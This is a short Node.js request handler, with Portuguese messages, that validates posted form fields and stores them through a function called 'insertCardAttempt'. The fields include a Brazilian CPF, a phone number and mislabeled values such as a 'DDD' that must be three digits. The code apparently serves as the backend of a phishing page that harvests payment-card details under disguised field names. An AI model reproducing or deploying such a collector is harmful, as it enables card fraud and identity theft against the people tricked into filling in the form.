const {
  insertCardAttempt,
  readJson,
  sendJson
} = require('./_utils');

function plainText(value, maxLength = 180) {
  return String(value ?? '').slice(0, maxLength);
}

function digitsOnly(value) {
  return plainText(value).replace(/\D/g, '');
}

module.exports = async function handler(req, res) {
  try {
    if (req.method !== 'POST') {
      return sendJson(res, 405, { message: 'Metodo nao permitido.' });
    }

    const body = await readJson(req);
    const row = {
      phone: plainText(body.phone),
      first_name: plainText(body.firstName || body.first_name),
      cpf: plainText(body.cpf),
      celular: digitsOnly(body.celular),
      age: plainText(body.age, 40),
      ddd: plainText(body.ddd, 3)
    };

    if (Object.values(row).some((value) => value === '')) {
      return sendJson(res, 400, { message: 'Preencha todos os campos.' });
    }

    if (!/^\d{3}$/.test(row.ddd)) {
      return sendJson(res, 400, { message: 'Informe um DDD com exatamente 3 numeros.' });
    }

    const attempt = await insertCardAttempt(row);
    return sendJson(res, 200, { ok: true, id: attempt?.id || null });
  } catch (error) {
    return sendJson(res, 500, { message: error.message || 'Erro ao salvar os dados.' });
  }
};
